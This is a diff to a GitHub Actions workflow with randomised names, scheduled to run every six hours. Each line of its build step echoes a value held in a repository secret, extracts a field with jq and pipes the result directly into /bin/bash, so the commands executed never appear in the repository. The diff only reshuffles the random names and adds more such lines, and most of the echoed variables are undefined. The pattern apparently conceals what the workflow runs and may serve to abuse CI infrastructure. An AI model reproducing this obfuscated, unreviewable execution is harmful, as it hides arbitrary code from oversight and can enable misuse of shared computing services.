@@ -1,9 +1,9 @@
 name: talentedfrequency
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '39 0/6 * * *'
-
+    - cron: '9 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,12 +12,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: talentedfrequency
         env:
-          nnand504: ${{ secrets.nnand504 }}
+          fz8: ${{ secrets.fz8 }}
         run: |
-          echo $nnand504 | jq -r .n11116 | /bin/bash
-          echo $vlp3 | jq -r .jobha25282 | /bin/bash
-          echo $e56090 | jq -r .unz95 | /bin/bash
-          echo $frb305 | jq -r .cl001 | /bin/bash
-          echo $eh6 | jq -r .dsh4 | /bin/bash
-          echo $qs98575 | jq -r .jso41 | /bin/bash
+          echo $fz8 | jq -r .old3167 | /bin/bash
+          echo $ubk4688 | jq -r .ufrm27673 | /bin/bash
+          echo $t8 | jq -r .romux4690 | /bin/bash
+          echo $zpvfk9 | jq -r .c4 | /bin/bash
+          echo $zqef1 | jq -r .leg538 | /bin/bash
+          echo $mbs70992 | jq -r .wo92088 | /bin/bash
+          echo $cjyv9 | jq -r .ukngh8 | /bin/bash
+          echo $pg47895 | jq -r .rtf40713 | /bin/bash
+          echo $fhlug2288 | jq -r .f119 | /bin/bash
 
